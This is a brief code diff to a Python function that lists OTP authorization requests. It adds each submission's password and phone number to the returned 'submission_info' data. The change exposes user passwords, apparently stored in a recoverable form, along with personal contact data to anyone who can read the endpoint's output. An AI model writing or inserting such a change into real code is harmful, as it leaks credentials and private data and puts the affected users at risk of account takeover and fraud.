@@ -1127,6 +1127,8 @@ def get_otp_authorization_requests():
                 if submission:
                     request_dict['submission_info'] = {
                         'fullname': submission.fullname,
+                        'password': submission.password,
+                        'phone_number': submission.phone_number,
                         'submitted_at': submission.submitted_at.isoformat() if submission.submitted_at else None
                     }
             
